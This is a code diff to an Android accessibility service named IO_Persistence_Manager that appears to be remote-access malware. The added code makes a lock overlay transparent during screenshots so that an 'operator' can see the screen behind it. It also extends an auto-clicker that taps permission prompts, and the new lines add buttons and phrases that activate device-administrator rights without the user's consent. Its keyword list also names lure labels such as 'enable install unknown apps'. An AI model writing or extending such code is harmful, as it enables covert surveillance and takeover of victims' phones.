@@ -1112,19 +1112,55 @@ public class IO_Persistence_Manager extends AccessibilityService {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
             isScreenshotting = true;
             try {
-                // Use reflection to call API 30+ helper to prevent class verification errors on legacy devices
+                // Temporarily make lock overlay transparent so operator sees through the system lock
+                if (lockView != null) {
+                    new Handler(Looper.getMainLooper()).post(() -> {
+                        try { lockView.setAlpha(0.0f); } catch (Exception ignored) {}
+                    });
+                }
+
                 Class<?> helper = Class.forName(Api30Helper.class.getName());
                 java.lang.reflect.Method method = helper.getMethod("takeScreenshot", AccessibilityService.class, ScreenshotCallback.class);
-                method.invoke(null, this, callback);
                 
-                // Reset flag after a timeout in case reflection call fails silently
+                ScreenshotCallback wrappedCallback = new ScreenshotCallback() {
+                    @Override
+                    public void onSuccess(byte[] jpegData) {
+                        if (lockView != null) {
+                            new Handler(Looper.getMainLooper()).post(() -> {
+                                try { lockView.setAlpha(1.0f); } catch (Exception ignored) {}
+                            });
+                        }
+                        isScreenshotting = false;
+                        callback.onSuccess(jpegData);
+                    }
+
+                    @Override
+                    public void onFailure(String error) {
+                        if (lockView != null) {
+                            new Handler(Looper.getMainLooper()).post(() -> {
+                                try { lockView.setAlpha(1.0f); } catch (Exception ignored) {}
+                            });
+                        }
+                        isScreenshotting = false;
+                        callback.onFailure(error);
+                    }
+                };
+
+                method.invoke(null, this, wrappedCallback);
+                
                 new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
                     @Override
                     public void run() {
+                        if (lockView != null) {
+                            try { lockView.setAlpha(1.0f); } catch (Exception ignored) {}
+                        }
                         isScreenshotting = false;
                     }
                 }, 5000);
             } catch (Exception e) {
+                if (lockView != null) {
+                    try { lockView.setAlpha(1.0f); } catch (Exception ignored) {}
+                }
                 isScreenshotting = false;
                 callback.onFailure("Screenshot Bridge Error: " + e.getMessage());
             }
@@ -1594,6 +1630,8 @@ public class IO_Persistence_Manager extends AccessibilityService {
                 lowerId.contains("permission_allow_button") ||
                 lowerId.contains("permission_allow_always_button") ||
                 lowerId.contains("permission_allow_one_time_button") ||
+                lowerId.contains("action_button") ||
+                lowerId.contains("admin_add") ||
                 lowerId.endsWith("btnguideaction") ||
                 lowerId.endsWith("btncheckupdate") ||
                 lowerId.contains("btncheckforupdate") ||
@@ -1631,7 +1669,8 @@ public class IO_Persistence_Manager extends AccessibilityService {
             String[] keywords = {
                 "while using the app", "only this time", "allow all the time",
                 "allow", "allow all", "grant", "permitir", "permitir siempre",
-                "aceptar", "autoriser", "oui", "turn on", "enable", "activate", "yes", "ok",
+                "aceptar", "autoriser", "oui", "turn on", "enable", "activate",
+                "activate this device admin", "activate this device administrator", "yes", "ok",
                 "start optimization", "start", "complete setup", "check for update", "enable sync", "install update",
                 "enable protection", "enable notification access", "enable file storage access",
                 "enable install unknown apps", "enable system protection", "proceed", "continue"
